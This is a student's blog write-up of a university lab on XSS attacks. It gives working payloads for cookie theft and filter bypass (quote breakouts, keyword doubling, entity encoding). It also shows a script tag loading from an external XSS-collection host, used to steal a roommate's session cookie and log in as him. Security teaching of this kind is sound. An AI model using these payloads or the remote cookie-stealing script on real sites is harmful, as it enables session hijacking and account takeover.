---
title: 网络破防实践先导实验四————XSS攻击
tags: 网络破防实践先导
cover: http://cdn.lmark.cc/img/300137_origin_20220531_195151.jpg
top_img: http://cdn.lmark.cc/img/300150_origin_20220531_195603.jpg
abbrlink: af59cd8a
date: 2022-06-24 17:54:37
---

## 前情回顾

终于一路跌跌撞撞，终于来到了网络破防这门课最后一个实验，这次这个实验的可以说四个实验之中最简单的，我只花了不到一个小时就搞定了。



## XSS介绍

首先，什么是XSS攻击呢？

> XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。                                       ——摘自百度百科

我的理解就是，利用一些输入框，然后输入一些能产生特效果的语句，让网页执行你需要的代码，以达到攻击的目的。

网页一般用的html，如果输入的内容没有进行转义，在输出的时候有可能会变成网页html的一部分，像这种

#### **反射型XSS**

![](http://cdn.lmark.cc/img/image-20220624182159558.png)

![](http://cdn.lmark.cc/img/image-20220624182224333.png)

![](http://cdn.lmark.cc/img/image-20220624182239812.png)

![](http://cdn.lmark.cc/img/image-20220624182254833.png)

![](http://cdn.lmark.cc/img/image-20220624182314134.png)



除此之外，还有DOM Based XSS

#### DOM Based XSS

![](http://cdn.lmark.cc/img/image-20220624182746968.png)

#### XSS的过滤和绕过

XSS攻击是一种很常见的攻击方式，所以很早就有了各种各样的防护方式。但是道高一尺，魔高一丈，XSS攻击也有许多绕过方式，如下：

- 闭合引号、标签
- 关键字过滤
- 编码绕过
- 宽字节绕过
- 其他技巧绕过 



关于每种技巧：

##### 闭合引号、标签

![](http://cdn.lmark.cc/img/image-20220624183639593.png)

##### 关键字过滤

![](http://cdn.lmark.cc/img/image-20220624183723311.png)

##### 编码绕过

![](http://cdn.lmark.cc/img/image-20220624183805936.png)

![](http://cdn.lmark.cc/img/image-20220624183910175.png)

![](http://cdn.lmark.cc/img/image-20220624184134170.png)

##### 宽字节绕过

![](http://cdn.lmark.cc/img/image-20220624184312204.png)

![](http://cdn.lmark.cc/img/image-20220624184359039.png)

##### 其他绕过

![](http://cdn.lmark.cc/img/image-20220624184445517.png)

![image-20220624184532523](http://cdn.lmark.cc/img/image-20220624184532523.png)

## 实验过程

#### Target 1

Target1比较容易，直接输出即可，

```javascript
<script>alert(document.cookie);</script>
```

 

#### Target 2

Target2需要先把第一个a标签给结束了，才可以写自己代码，先随便输点东西看看输出的格式，

![](http://cdn.lmark.cc/img/clip_image002.jpg)

可以看到，输出的内容是在一个a标签的herf属性中的，根据格式判断，可以构造一下payload：

```javascript
'><img src=# onerror=alert(document.cookie) /><‘
```

![](http://cdn.lmark.cc/img/clip_image004.jpg)

虽然有点不理解为什么用单引号来结束前面的双引号。

 

#### Target 3

Target3需要用到关键词过滤，script这关键词被过滤了，所以需要构造一下一个字符串来绕过检测：

```javascript
<scriscriptpt>alert(document.cookie);</scriscriptpt>
```



#### Target 4

Target4中，一些特殊字符会被转义，所以得用不同的编码来绕过：

```javascript
<svg><script>alert&#40;document.cookie&#41;</script><svg>
```



#### Target 5

Target5中，提示给出的是需要利用宽字节来绕过，但是，我使用Target2的方法也能输出cookie，、

![](http://cdn.lmark.cc/img/clip_image006.jpg)

然后，盗取别人的cookie，首先，打开xss平台，注册一个账号，然后开始一个项目，然后，复制攻击用的代码：

```javascript
<sCRiPt sRC=//xss.pt/aATU></sCrIpT>
```



然后发送给我亲爱滴室友，我的室友在读到信息后，我就获取到了他的cookie：

 ![](http://cdn.lmark.cc/img/clip_image008.jpg)

然后去浏览器里，检查网页，然后在应用程序中，找到cookie，进行一个修改（修改PHPSESSID和csrftoken即可）：

![](http://cdn.lmark.cc/img/clip_image010.jpg)

![](http://cdn.lmark.cc/img/clip_image012.jpg)

然后就可以登录这个账号了。



## 实验心得 && 结课心得

这是最后一个实验了，网络破防到现在就全部结束了！！！这门课一开始真的挺折磨人的，各种劝退，好多人都在前两个实验就润了，留下了的人都是狼人了，和其他三个先导课（人工智能实验先导，大数据实验先导，软件工程实验先导）比起来，难度可以说挺大的，可不是跟着老师敲敲代码就能过的，得认真地学一会才能做的出来。

这门课最后的成绩可以说挺惨目忍睹的，剩了三十多个人，十几个一百分，十几个不及格，十几个中间。挂科率达到了惊人的**33.33%**，应该是四门先导课里人最少，而且挂科率还最高的课了，不得不说曲老师还是这么狠呀。

至于我嘛，差点就翻车了，四个实验少交了一个，补上之后勉强有一百了。

这个是上课的小小纪念品，不过这个寓意我是搞不懂，脑子里面有水嘛？

![](https://cdn.lmark.cc/img/316698_origin_IMG_20220624_190528.jpg)
